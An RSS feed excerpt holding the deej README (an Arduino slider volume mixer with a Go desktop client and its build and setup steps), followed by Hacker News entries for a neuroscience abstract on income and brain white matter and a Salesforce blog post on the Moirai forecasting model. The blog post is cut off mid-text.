<p dir="auto"><a href="https://discord.gg/nf88NJu" rel="nofollow"><img src="https://camo.githubusercontent.com/21efeafcfe76a8b3c0a0e8e29f2dd89a56a54e6192f8cb0d6cef0730e9df3c5a/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f3730323934303530323033383933373636373f6c6f676f3d646973636f7264" alt="Discord" data-canonical-src="https://img.shields.io/discord/702940502038937667?logo=discord"></a></p>
<blockquote>
<p dir="auto"><strong><em>New:</em></strong> <a href="https://github.com/omriharel/deej/blob/master/docs/faq/faq.md">work-in-progress deej FAQ</a>!</p>
</blockquote>
<p dir="auto">deej consists of a <a href="#features">lightweight desktop client</a> written in Go, and an Arduino-based hardware setup that's simple and cheap to build. <a href="https://github.com/omriharel/deej/blob/master/community.md"><strong>Check out some versions built by members of our community!</strong></a></p>
<p dir="auto"><strong><a href="https://github.com/omriharel/deej/releases/latest">Download the latest release</a> | <a href="https://youtu.be/VoByJ4USMr8" rel="nofollow">Video demonstration</a> | <a href="https://youtu.be/x2yXbFiiAeI" rel="nofollow">Build video by Tech Always</a></strong></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/omriharel/deej/blob/master/assets/build-3d-annotated.png"><img src="https://github.com/omriharel/deej/raw/master/assets/build-3d-annotated.png" alt="deej"></a></p>
<blockquote>
<p dir="auto"><em><strong>Psst!</strong> <a href="https://github.com/omriharel/deej/blob/master/assets/build-shoebox.jpg">No 3D printer? No problem!</a></em> You can build deej on some cardboard, a shoebox or even a breadboard :)</p>
</blockquote>
<p dir="auto"><h2 tabindex="-1" dir="auto">Table of contents</h2><a id="user-content-table-of-contents" aria-label="Permalink: Table of contents" href="#table-of-contents"></a></p>
<ul dir="auto">
<li><a href="#features">Features</a></li>
<li><a href="#how-it-works">How it works</a>
<ul dir="auto">
<li><a href="#hardware">Hardware</a>
<ul dir="auto">
<li><a href="#schematic">Schematic</a></li>
</ul>
</li>
<li><a href="#software">Software</a></li>
</ul>
</li>
<li><a href="#slider-mapping-configuration">Slider mapping (configuration)</a></li>
<li><a href="#build-your-own">Build your own!</a>
<ul dir="auto">
<li><a href="#faq">FAQ</a></li>
<li><a href="#build-video">Build video</a></li>
<li><a href="#bill-of-materials">Bill of Materials</a></li>
<li><a href="#thingiverse-collection">Thingiverse collection</a></li>
<li><a href="#build-procedure">Build procedure</a></li>
</ul>
</li>
<li><a href="#how-to-run">How to run</a>
<ul dir="auto">
<li><a href="#requirements">Requirements</a></li>
<li><a href="#download-and-installation">Download and installation</a></li>
<li><a href="#building-from-source">Building from source</a></li>
</ul>
</li>
<li><a href="#community">Community</a></li>
<li><a href="#license">License</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<p dir="auto">deej is written in Go and <a href="https://github.com/omriharel/deej/releases/latest">distributed</a> as a portable (no installer needed) executable.</p>
<ul dir="auto">
<li>Bind apps to different sliders
<ul dir="auto">
<li>Bind multiple apps per slider (i.e. one slider for all your games)</li>
<li>Bind the master channel</li>
<li>Bind "system sounds" (on Windows)</li>
<li>Bind specific audio devices by name (on Windows)</li>
<li>Bind currently active app (on Windows)</li>
<li>Bind all other unassigned apps</li>
</ul>
</li>
<li>Control your microphone's input level</li>
<li>Lightweight desktop client, consuming around 10MB of memory</li>
<li>Runs from your system tray</li>
<li>Helpful notifications to let you know if something isn't working</li>
</ul>
<blockquote>
<p dir="auto"><strong>Looking for the older Python version?</strong> It's no longer maintained, but you can always find it in the <a href="https://github.com/omriharel/deej/tree/legacy-python"><code>legacy-python</code> branch</a>.</p>
</blockquote>
<p dir="auto"><h2 tabindex="-1" dir="auto">How it works</h2><a id="user-content-how-it-works" aria-label="Permalink: How it works" href="#how-it-works"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Hardware</h3><a id="user-content-hardware" aria-label="Permalink: Hardware" href="#hardware"></a></p>
<ul dir="auto">
<li>The sliders are connected to 5 (or as many as you like) analog pins on an Arduino Nano/Uno board. They're powered from the board's 5V output (see schematic)</li>
<li>The board connects via a USB cable to the PC</li>
</ul>
<p dir="auto"><h4 tabindex="-1" dir="auto">Schematic</h4><a id="user-content-schematic" aria-label="Permalink: Schematic" href="#schematic"></a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/omriharel/deej/blob/master/assets/schematic.png"><img src="https://github.com/omriharel/deej/raw/master/assets/schematic.png" alt="Hardware schematic"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Software</h3><a id="user-content-software" aria-label="Permalink: Software" href="#software"></a></p>
<ul dir="auto">
<li>The code running on the Arduino board is a <a href="https://github.com/omriharel/deej/blob/master/arduino/deej-5-sliders-vanilla/deej-5-sliders-vanilla.ino">C program</a> constantly writing current slider values over its serial interface</li>
<li>The PC runs a lightweight <a href="https://github.com/omriharel/deej/blob/master/pkg/deej/cmd/main.go">Go client</a> in the background. This client reads the serial stream and adjusts app volumes according to the given configuration file</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Slider mapping (configuration)</h2><a id="user-content-slider-mapping-configuration" aria-label="Permalink: Slider mapping (configuration)" href="#slider-mapping-configuration"></a></p>
<p dir="auto">deej uses a simple YAML-formatted configuration file named <a href="https://github.com/omriharel/deej/blob/master/config.yaml"><code>config.yaml</code></a>, placed alongside the deej executable.</p>
<p dir="auto">The config file determines which applications (and devices) are mapped to which sliders, and which parameters to use for the connection to the Arduino board, as well as other user preferences.</p>
<p dir="auto"><strong>This file auto-reloads when its contents are changed, so you can change application mappings on-the-fly without restarting deej.</strong></p>
<p dir="auto">It looks like this:</p>
<div dir="auto" data-snippet-clipboard-copy-content="slider_mapping:
  0: master
  1: chrome.exe
  2: spotify.exe
  3:
    - pathofexile_x64.exe
    - rocketleague.exe
  4: discord.exe

# set this to true if you want the controls inverted (i.e. top is 0%, bottom is 100%)
invert_sliders: false

# settings for connecting to the arduino board
com_port: COM4
baud_rate: 9600

# adjust the amount of signal noise reduction depending on your hardware quality
# supported values are &quot;low&quot; (excellent hardware), &quot;default&quot; (regular hardware) or &quot;high&quot; (bad, noisy hardware)
noise_reduction: default"><pre><span>slider_mapping</span>:
  <span>0</span>: <span>master</span>
  <span>1</span>: <span>chrome.exe</span>
  <span>2</span>: <span>spotify.exe</span>
  <span>3</span>:
    - <span>pathofexile_x64.exe</span>
    - <span>rocketleague.exe</span>
  <span>4</span>: <span>discord.exe</span>

<span><span>#</span> set this to true if you want the controls inverted (i.e. top is 0%, bottom is 100%)</span>
<span>invert_sliders</span>: <span>false</span>

<span><span>#</span> settings for connecting to the arduino board</span>
<span>com_port</span>: <span>COM4</span>
<span>baud_rate</span>: <span>9600</span>

<span><span>#</span> adjust the amount of signal noise reduction depending on your hardware quality</span>
<span><span>#</span> supported values are "low" (excellent hardware), "default" (regular hardware) or "high" (bad, noisy hardware)</span>
<span>noise_reduction</span>: <span>default</span></pre></div>
<ul dir="auto">
<li><code>master</code> is a special option to control the master volume of the system <em>(uses the default playback device)</em></li>
<li><code>mic</code> is a special option to control your microphone's input level <em>(uses the default recording device)</em></li>
<li><code>deej.unmapped</code> is a special option to control all apps that aren't bound to any slider ("everything else")</li>
<li>On Windows, <code>deej.current</code> is a special option to control whichever app is currently in focus</li>
<li>On Windows, you can specify a device's full name, i.e. <code>Speakers (Realtek High Definition Audio)</code>, to bind that device's level to a slider. This doesn't conflict with the default <code>master</code> and <code>mic</code> options, and works for both input and output devices.
<ul dir="auto">
<li>Be sure to use the full device name, as seen in the menu that comes up when left-clicking the speaker icon in the tray menu</li>
</ul>
</li>
<li><code>system</code> is a special option on Windows to control the "System sounds" volume in the Windows mixer</li>
<li>All names are case-<strong>in</strong>sensitive, meaning both <code>chrome.exe</code> and <code>CHROME.exe</code> will work</li>
<li>You can create groups of process names (using a list) to either:
<ul dir="auto">
<li>control more than one app with a single slider</li>
<li>choose whichever process in the group that's currently running (i.e. to have one slider control any game you're playing)</li>
</ul>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Build your own!</h2><a id="user-content-build-your-own" aria-label="Permalink: Build your own!" href="#build-your-own"></a></p>
<p dir="auto">Building deej is very simple. You only need a few relatively cheap parts - it's an excellent starter project (and my first Arduino project, personally). Remember that if you need any help or have a question that's not answered here, you can always <a href="https://discord.gg/nf88NJu" rel="nofollow">join the deej Discord server</a>.</p>
<p dir="auto">Build deej for yourself, or as an awesome gift for your gaming buddies!</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">FAQ</h3><a id="user-content-faq" aria-label="Permalink: FAQ" href="#faq"></a></p>
<p dir="auto">I've started a highly focused effort of writing a proper FAQ page for deej, covering many basic and advanced topics.</p>
<p dir="auto">It is still <em>very much a work-in-progress</em>, but I'm happy to <a href="https://github.com/omriharel/deej/blob/master/docs/faq/faq.md">share it in its current state</a> in hopes that it at least covers some questions you might have.</p>
<p dir="auto">FAQ feedback in our <a href="https://discord.gg/nf88NJu" rel="nofollow">community Discord</a> is strongly encouraged :)</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Build video</h3><a id="user-content-build-video" aria-label="Permalink: Build video" href="#build-video"></a></p>
<p dir="auto">In case you prefer watching to reading, Charles from the <a href="https://www.youtube.com/c/TechAlways" rel="nofollow"><strong>Tech Always</strong></a> YouTube channel has made <a href="https://youtu.be/x2yXbFiiAeI" rel="nofollow"><strong>a fantastic video</strong></a> that covers the basics of building deej for yourself, including parts, costs, assembly and software. I highly recommend checking it out!</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Bill of Materials</h3><a id="user-content-bill-of-materials" aria-label="Permalink: Bill of Materials" href="#bill-of-materials"></a></p>
<ul dir="auto">
<li>An Arduino Nano, Pro Micro or Uno board
<ul dir="auto">
<li>I officially recommend using a Nano or a Pro Micro for their smaller form-factor, friendlier USB connectors and more analog pins. Plus they're cheaper</li>
<li>You can also use any other development board that has a Serial over USB interface</li>
</ul>
</li>
<li>A few slider potentiometers, up to your number of free analog pins (the cheaper ones cost around 1-2 USD each, and come with a standard 10K Ohm variable resistor. These <em>should</em> work just fine for this project)
<ul dir="auto">
<li><strong>Important:</strong> make sure to get <strong>linear</strong> sliders, not logarithmic ones! Check the product description</li>
<li>You can also use circular knobs if you like</li>
</ul>
</li>
<li>Some wires</li>
<li>Any kind of box to hold everything together. <strong>You don't need a 3D printer for this project!</strong> It works fantastically with just a piece of cardboard or a shoebox. That being said, if you do have one, read on...</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Thingiverse collection</h3><a id="user-content-thingiverse-collection" aria-label="Permalink: Thingiverse collection" href="#thingiverse-collection"></a></p>
<p dir="auto">With many different 3D-printed designs being added to our <a href="https://github.com/omriharel/deej/blob/master/community.md">community showcase</a>, it felt right to gather all of them in a Thingiverse collection for you to browse. If you have access to a 3D printer, feel free to use one of the designs in your build.</p>
<p dir="auto"><strong><a href="https://thingiverse.com/omriharel/collections/deej" rel="nofollow">Visit our community-created design collection on Thingiverse!</a></strong></p>
<blockquote>
<p dir="auto">You can also <a href="https://discord.gg/nf88NJu" rel="nofollow">submit your own</a> design to be added to the collection. Regardless, if you do upload your design to Thingiverse, <em>please add a <code>deej</code> tag to it so that others can find it more easily</em>.</p>
</blockquote>
<p dir="auto"><h3 tabindex="-1" dir="auto">Build procedure</h3><a id="user-content-build-procedure" aria-label="Permalink: Build procedure" href="#build-procedure"></a></p>
<ul dir="auto">
<li>Connect everything according to the <a href="#schematic">schematic</a></li>
<li>Test with a multimeter to be sure your sliders are hooked up correctly</li>
<li>Flash the Arduino chip with the sketch in <a href="https://github.com/omriharel/deej/blob/master/arduino/deej-5-sliders-vanilla/deej-5-sliders-vanilla.ino"><code>arduino\deej-5-sliders-vanilla</code></a>
<ul dir="auto">
<li><em>Important:</em> If you have more or less than 5 sliders, you must edit the sketch to match what you have</li>
</ul>
</li>
<li>After flashing, check the serial monitor. You should see a constant stream of values separated by a pipe (<code>|</code>) character, e.g. <code>0|240|1023|0|483</code>
<ul dir="auto">
<li>When you move a slider, its corresponding value should move between 0 and 1023</li>
</ul>
</li>
<li>Congratulations, you're now ready to run the deej executable!</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">How to run</h2><a id="user-content-how-to-run" aria-label="Permalink: How to run" href="#how-to-run"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Requirements</h3><a id="user-content-requirements" aria-label="Permalink: Requirements" href="#requirements"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Windows</h4><a id="user-content-windows" aria-label="Permalink: Windows" href="#windows"></a></p>
<ul dir="auto">
<li>Windows. That's it</li>
</ul>
<p dir="auto"><h4 tabindex="-1" dir="auto">Linux</h4><a id="user-content-linux" aria-label="Permalink: Linux" href="#linux"></a></p>
<ul dir="auto">
<li>Install <code>libgtk-3-dev</code>, <code>libappindicator3-dev</code> and <code>libwebkit2gtk-4.0-dev</code> for system tray support. Pre-built Linux binaries aren't currently released, so you'll need to <a href="#building-from-source">build from source</a>. If there's demand for pre-built binaries, please <a href="https://discord.gg/nf88NJu" rel="nofollow">let me know</a>!</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Download and installation</h3><a id="user-content-download-and-installation" aria-label="Permalink: Download and installation" href="#download-and-installation"></a></p>
<ul dir="auto">
<li>Head over to the <a href="https://github.com/omriharel/deej/releases">releases page</a> and download the <a href="https://github.com/omriharel/deej/releases/latest">latest version</a>'s executable and configuration file (<code>deej.exe</code> and <code>config.yaml</code>)</li>
<li>Place them in the same directory anywhere on your machine</li>
<li>(Optional, on Windows) Create a shortcut to <code>deej.exe</code> and copy it to <code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</code> to have deej run on boot</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Building from source</h3><a id="user-content-building-from-source" aria-label="Permalink: Building from source" href="#building-from-source"></a></p>
<p dir="auto">If you'd rather not download a compiled executable, or want to extend deej or modify it to your needs, feel free to clone the repository and build it yourself. All you need is a Go 1.14 (or above) environment on your machine. If you go this route, make sure to check out the <a href="https://github.com/omriharel/deej/blob/master/pkg/deej/scripts">developer scripts</a>.</p>
<p dir="auto">Like other Go packages, you can also use the <code>go get</code> tool: <code>go get -u github.com/omriharel/deej</code>. Please note that the package code now resides in the <code>pkg/deej</code> directory, and needs to be imported from there if used inside another project.</p>
<p dir="auto">If you need any help with this, please <a href="https://discord.gg/nf88NJu" rel="nofollow">join our Discord server</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Community</h2><a id="user-content-community" aria-label="Permalink: Community" href="#community"></a></p>
<p dir="auto"><a href="https://discord.gg/nf88NJu" rel="nofollow"><img src="https://camo.githubusercontent.com/21efeafcfe76a8b3c0a0e8e29f2dd89a56a54e6192f8cb0d6cef0730e9df3c5a/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f3730323934303530323033383933373636373f6c6f676f3d646973636f7264" alt="Discord" data-canonical-src="https://img.shields.io/discord/702940502038937667?logo=discord"></a></p>
<p dir="auto">deej is a relatively new project, but a vibrant and awesome community is rapidly growing around it. Come hang out with us in the <a href="https://discord.gg/nf88NJu" rel="nofollow">deej Discord server</a>, or check out a whole bunch of cool and creative builds made by our members in the <a href="https://github.com/omriharel/deej/blob/master/community.md">community showcase</a>.</p>
<p dir="auto">The server is also a great place to ask questions, suggest features or report bugs (but of course, feel free to use GitHub if you prefer).</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Donations</h3><a id="user-content-donations" aria-label="Permalink: Donations" href="#donations"></a></p>
<p dir="auto">If you love deej and want to show your support for this project, you can do so using the link below. Please don't feel obligated to donate - building the project and telling your friends about it goes a very long way! Thank you very much.</p>
<p dir="auto"><a href="https://ko-fi.com/omriharel" rel="nofollow"><img src="https://camo.githubusercontent.com/552bca7ad4a634b3ee2168758c2e3d288e786d2185d77c2892bcdee7f8a53df8/68747470733a2f2f7777772e6b6f2d66692e636f6d2f696d672f676974687562627574746f6e5f736d2e737667" alt="ko-fi" data-canonical-src="https://www.ko-fi.com/img/githubbutton_sm.svg"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Contributing</h3><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">Please see <a href="https://github.com/omriharel/deej/blob/master/docs/CONTRIBUTING.md"><code>docs/CONTRIBUTING.md</code></a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">deej is released under the <a href="https://github.com/omriharel/deej/blob/master/LICENSE">MIT license</a>.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Lifelong Disadvantage: How Socioeconomics Affect Brain Function (151 pts)]]></title>
            <link>https://www.jneurosci.org/content/early/2024/03/07/JNEUROSCI.1231-23.2024</link>
            <guid>39823282</guid>
            <pubDate>Tue, 26 Mar 2024 01:14:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.jneurosci.org/content/early/2024/03/07/JNEUROSCI.1231-23.2024">https://www.jneurosci.org/content/early/2024/03/07/JNEUROSCI.1231-23.2024</a>, See on <a href="https://news.ycombinator.com/item?id=39823282">Hacker News</a></p>
<div id="readability-page-1" class="page"><div class="page" id="page">
	  <div data-node-nid="681452" id="node-681452--2666709058" data-pisa="jneuro;JNEUROSCI.1231-23.2024v1" data-pisa-master="jneuro;JNEUROSCI.1231-23.2024" data-apath="/jneuro/early/2024/03/07/JNEUROSCI.1231-23.2024.atom" data-hw-author-tooltip-instance="highwire_author_tooltip">
  
  
      <p><span><span>Research Articles, Behavioral/Cognitive</span></span></p>
  
      
  
        
    	<p><span>, <span data-delta="1">Olga Trofimova</span>, <span data-delta="2">Morgane Künzi</span>, <span data-delta="3">Cristina Ramponi</span>, <span data-delta="4">Antoine Lutti</span>, <span data-delta="5">Ferath Kherif</span>, <span data-delta="6">Adeliya Latypova</span>, <span data-delta="7">Peter Vollenweider</span>, <span data-delta="8">Pedro Marques-Vidal</span>, <span data-delta="9">Martin Preisig</span>, <span data-delta="10">Matthias Kliegel</span>, <span data-delta="11">Silvia Stringhini</span> and <span data-delta="12">Bogdan Draganski</span></span></p>
  
    	<p><span>Journal of Neuroscience </span><span>18 March 2024,  </span><span>e1231232024; </span><span>DOI: https://doi.org/10.1523/JNEUROSCI.1231-23.2024 </span></p>
  
  
    	
  
</div> <!-- /.panel-row-wrapper -->	
	  
  <div data-panels-ajax-tab-preloaded="jnl_sfneneuro_tab_art" id="panels-ajax-tab-container-highwire_article_tabs"><div xmlns="http://www.w3.org/1999/xhtml" data-highwire-cite-ref-tooltip-instance="highwire_reflinks_tooltip" xmlns:xhtml="http://www.w3.org/1999/xhtml"><div id="abstract-1"><h2>Abstract</h2><p id="p-6">Despite major advances, our understanding of the neurobiology of life course socioeconomic conditions is still scarce. This study aimed to provide insight into the pathways linking socioeconomic exposures – household income, last-known occupational position, and life course socioeconomic trajectories – with brain microstructure and cognitive performance in middle to late adulthood. We assessed socioeconomic conditions alongside quantitative relaxometry and diffusion-weighted magnetic resonance imaging indicators of brain tissue microstructure, and cognitive performance in a sample of community-dwelling men and women (N=751, aged 50-91 years). We adjusted the applied regression analyses and structural equation models for the linear and non-linear effects of age, sex, education, cardiovascular risk factors, and presence of depressive, anxiety, and substance use disorders. Individuals from lower income households showed signs of advanced brain white matter aging with greater mean diffusivity, lower neurite density, lower myelination, and lower iron content. The association between household income and mean diffusivity was mediated by neurite density (B=0.084, p=0.003) and myelination (B=0.019, p=0.009); mean diffusivity partially mediated the association between household income and cognitive performance (B=0.017, p&lt;0.05). Household income moderated the relation between white matter microstructure and cognitive performance, such that greater mean diffusivity, lower myelination, or lower neurite density was only associated with poorer cognitive performance among individuals from lower income households. Individuals from higher income households showed preserved cognitive performance even with greater mean diffusivity, lower myelination, or lower neurite density. These findings provide novel mechanistic insight into associations between socioeconomic conditions, brain anatomy, and cognitive performance in middle to late adulthood.</p><p id="p-7"><strong>Significance statement</strong> Pathways linking socioeconomic conditions, brain anatomy, and cognitive performance have rarely been investigated. Using multi-contrast imaging, we found that individuals from lower income households had markers of advanced brain white matter aging with lower neurite density, lower myelination, and lower iron content, alongside greater mean diffusivity. Greater mean diffusivity (reflecting myelin and neurite density) contributed to the association between household income and cognitive performance. Household income also buffered the observed white matter effects, such that greater mean diffusivity, lower index of myelin content, or lower neurite density was only associated with poorer cognitive performance among individuals from lower income households. These findings provide a detailed neurobiological understanding of socioeconomic differences in brain anatomy and associated cognitive performance.</p></div><div id="fn-group-1"><h2>Footnotes</h2><ul><li id="fn-2"><p id="p-2">The authors declare no competing financial interests.</p></li><li id="fn-3"><p id="p-3">This work was supported by the Leenaards Foundation Scientific Prize, awarded to S. Stringhini, M. Kliegel, and B. Draganski. The CoLaus|PsyCoLaus study was supported by research grants from GlaxoSmithKline, the Faculty of Biology and Medicine of Lausanne, the Swiss National Science Foundation (grants 3200B0_105993, 3200B0_118308, 33CSCO_122661, 33CS30_139468, 33CS30_148401, 33CS30_177535, 3247730_204523, 32003B_135679, 32003B_159780, 324730_192755, and CRSK-3_190185), the ERA-NET iSEE project, and the Swiss Personalized Health Network (project: Swiss Ageing Citizen Reference). LREN is very grateful to the ROGER DE SPOELBERCH and Partridge Foundations for their generous financial support. The authors thank those who participated in the CoLaus|PsyCoLaus study, as well as all of those who made the CoLaus|PsyCoLaus study possible.</p></li><li id="fn-4"><p id="p-4"><a href="#xref-fn-4-1">↵</a><sup>*</sup>equal contribution</p></li></ul></div></div>
<div id="mini-panel-jnl_sfneneuro_challenge"><div>
  
      
  
  <p>
    <h3>Member Log In</h3>
  </p>

  
  </div>
<div>
    <div><h3>Log in using your username and password</h3></div><div><h3>Purchase access</h3><p>You may purchase access to this article. This will require you to <a href="https://www.jneurosci.org/user/register">create an account</a> if you don't already have one.</p></div>  </div>
</div>
</div> <!-- /.panel-row-wrapper -->	
	
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Moirai: A time series foundation model for universal forecasting (177 pts)]]></title>
            <link>https://blog.salesforceairesearch.com/moirai/</link>
            <guid>39823104</guid>
            <pubDate>Tue, 26 Mar 2024 00:51:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.salesforceairesearch.com/moirai/">https://blog.salesforceairesearch.com/moirai/</a>, See on <a href="https://news.ycombinator.com/item?id=39823104">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
          
          <p><strong>TL;DR: </strong>Moirai is a cutting-edge time series foundation model, offering universal forecasting capabilities. It stands out as a versatile time series forecasting model capable of addressing diverse forecasting tasks across multiple domains, frequencies, and variables in a zero-shot manner.&nbsp; To achieve this, Moirai tackles four major challenges: (i) construction of a LOTSA, a large-scale and diverse time series dataset, comprising 27 billion observations spanning nine distinct domains, (ii) development of multiple patch size projection layers, allowing a single model to capture temporal patterns across various frequencies, (iii) implementation of an any-variate attention mechanism, empowering a single model to handle forecasts across any variable, and (iv) integration of a mixture distribution to model flexible predictive distributions. Through comprehensive evaluation in both in-distribution and out-of-distribution settings, Moirai demonstrates its prowess as a zero-shot forecaster, consistently delivering competitive or superior performance compared to full-shot models.</p><h3 id="the-need-for-a-universal-forecaster"><strong>The need for a universal forecaster&nbsp;</strong></h3><p>Time series data pervades numerous domains, including retail, finance, manufacturing, healthcare, and natural sciences. Across these sectors, time series forecasting is a critical application with significant implications for decision making. Although significant strides have been made in deep learning for time series forecasting, recent advancements still predominantly adhere to the conventional paradigm of training a model for a specific dataset with a fixed, pre-defined context and prediction length. Such a paradigm inevitably imposes a significant burden in terms of computational costs for training these models, especially when scaling to large numbers of users.</p><p>For example, a growing demand for cloud computing services has magnified the importance of efficiently managing resources in I.T. infrastructure. Operational forecasting has emerged as a critical component in the pipeline of managing these resources, as the main driving factor for capacity planning, budget planning, scenario risk assessment, cost optimization, and anomaly detection. However, with the ever-increasing demand for compute resources and the growing size of I.T. infrastructure, the ability of service providers to handle the forecasting needs across the multitude of tasks is continually challenged, on top of having to build task/user-specific forecasters.</p><p>This motivates us to move towards the <strong>universal forecasting </strong>paradigm (see Figure 1), where a single large pre-trained model is capable of handling any time series forecasting problem.<br></p><figure><img src="https://lh7-us.googleusercontent.com/Uce4IUNaaJeSTseY72A7zPY6Edkcgy-v06c59hJgH8v4cprGDgMrkSN2iUIDazcLebg19MzrNTPBJ11i7UFO9nvTaRsPyLiJ3Mv3UGhrmLTOt_NB-9EA09LKwNjSm7U1UFQY52PPEA6MceM4_qNdIJ0" alt="" loading="lazy" width="1600" height="927"></figure><p><em>Figure 1. A universal forecaster is a large pre-trained model capable of handling any time series forecasting problem. It is trained on a large-scale time series dataset spanning multiple domains. Compared to the existing paradigm, universal forecasting faces the three key issues of i) multiple frequencies, ii) any-variate forecasting, and iii) varying distributions.</em></p><h3 id="the-challenges-for-building-a-universal-forecaster"><strong>The challenges for building a universal forecaster</strong></h3><p>The paradigm shift towards foundation models was initially sparked by the field of Natural Language Processing (NLP) which successfully trained Large Language Models (LLMs) on diverse web-scale data, capable of tackling a wide variety of downstream tasks and are even multilingual. One major innovation that allows for LLMs to handle multiple languages is Byte Pair Encoding (BPE) – converting heterogeneous languages into a unified format. Unlike NLP, the field of time series does not have a BPE equivalent, making it non-trivial to build a time series foundation that can handle the heterogeneity of time series data.</p><ul><li>Firstly, the frequency (e.g., minutely, hourly, daily sampling rates) of time series plays a crucial role in determining the patterns present in the data. However, cross-frequency learning poses challenges due to negative interference, with existing approaches typically circumventing this issue for multi-frequency datasets by training one model per frequency.</li><li>Secondly, time series data exhibit heterogeneity in terms of dimensionality, where multivariate time series may have varying numbers of variables. Moreover, each variable often measures a semantically distinct quantity across datasets. While treating each variable of a multivariate time series independently can mitigate this issue, a universal model should ideally be flexible enough to consider interactions between variables and account for exogenous covariates.</li><li>Thirdly, probabilistic forecasting is a critical requirement for many applications. However, different datasets possess varying support and distributional properties. For instance, using a symmetric distribution (e.g., Normal, Student-T) as the predictive distribution may not be suitable for positive time series. Consequently, standard approaches that pre-define a simple parametric distribution may lack the flexibility needed to capture the diverse range of datasets effectively.</li><li>Lastly, the development of a large pre-trained model capable of universal forecasting necessitates a comprehensive dataset spanning diverse domains. Unfortunately, existing time series datasets are often insufficiently large and diverse to support the training of such models.</li></ul><h3 id="our-new-approach-unified-training-of-universal-time-series-forecasting-transformers"><strong>Our New Approach: Unified Training of Universal Time Series Forecasting Transformers</strong></h3><figure><img src="https://lh7-us.googleusercontent.com/TNMispgc6wQdAYD3U1Now7ivOwe46i3rHG-XtzTQR3iAdsNkevH_zJ2wcxIuVg8lYquPAR1Q_AP0FhkPvXZrOR3izbHPbmUu16tRifO9-cRTIF0VHxbAdK8DBSoCWhYnF-H37OcSJFCbxjODBqApsdI" alt="" loading="lazy" width="1600" height="597"></figure><p><em>Figure 2. The overall architecture of Moirai. The visualization depicts a 3-variate time series, where variates 0 and 1 represent target variables (i.e., those to be forecasted), and variate 2 serves as a dynamic covariate (with known values in the forecast horizon). Utilizing a patch size of 64, each variate is patchified into three tokens. These patch embeddings, along with sequence and variate identifiers, are fed into the Transformer. The shaded patches in the visualization denote the forecast horizon to be predicted. The corresponding output representations of these patches are then mapped into the parameters of the mixture distribution.</em></p><p>To address these challenges, we present novel enhancements (see Figure 2) to the conventional time series Transformer architecture to handle the heterogeneity of arbitrary time series data. Here are some of the key features and contributions of our work:</p><ul><li>Firstly, we propose to address the challenge of varying frequencies in time series data by learning multiple input and output projection layers. These layers are designed to handle the diverse patterns present in time series of different frequencies. By employing patch-based projections with larger patch sizes for high-frequency data and vice versa, the projection layers are specialized to learn the patterns specific to each frequency.</li><li>Secondly, we tackle the issue of varying dimensionality using our proposed Any-variate Attention mechanism. This approach simultaneously considers both the time and variate axes as a single sequence, leveraging Rotary Position Embeddings (RoPE) and learned binary attention biases to encode the time and variate axes, respectively. Importantly, Any-variate Attention enables the model to accept an arbitrary number of variates as input.</li><li>Thirdly, we overcome the challenge of requiring flexible predictive distributions by introducing a mixture of parametric distributions. By optimizing the negative log-likelihood of a flexible distribution, we ensure that our model is competitive with target metric optimization, a powerful feature for pre-training universal forecasters. This approach allows for subsequent evaluation using any target metric.</li><li>Lastly, to facilitate the training of our large time series model, we introduce the LOTSA, the largest collection of open time series datasets by collating publicly available sources of time series datasets. This effort aims to cover a broad spectrum of domains, consolidating datasets from diverse sources with varying formats. The resulting collection spans nine domains, with a total of 27B observations, with key statistics in Tables 2 and 3. More details on the key properties of these datasets, like the domain, frequency, number of time series, number of target variates, number</li></ul><p>of past covariates, and the total number of observations can be found in our research paper (<a href="https://arxiv.org/abs/2402.02592?ref=blog.salesforceairesearch.com"><u>https://arxiv.org/abs/2402.02592</u></a>).<br></p><figure><img src="https://lh7-us.googleusercontent.com/61ZRODYLOxjflX-7nitzYcWcNtdZZ2ZYllIIm_FoyXg6uP63ThL7Y3CL6BrwywrGNLhMo0QPv-VfVEmwkfW5xwsDjzsq7Mib0PSfJk7ts4TGfmeYrMe-4D_4pH5pr7YTZJ3LVVf2qXgRt0Y9BjOSjQ8" alt="" loading="lazy" width="1600" height="462"></figure><h3 id="deeper-dive-moirai"><strong>Deeper Dive: Moirai</strong></h3><p>Illustrated in Figure 2, Moirai follows a (non-overlapping) patch-based approach to modeling time series with a masked encoder architecture. One of our proposed modifications to extend the architecture to the any-variate setting is to "flatten" multivariate time series, considering all variates as a single sequence. Patches are subsequently projected into vector representations via a multi-patch size input projection layer. The [mask] signifies a learnable embedding that replaces patches falling within the forecast horizon. The output tokens are then decoded via the multi-patch size output projection into the parameters of the mixture distribution. While not visualized, (non-learnable) instance normalization is applied to inputs/outputs, aligning with the current 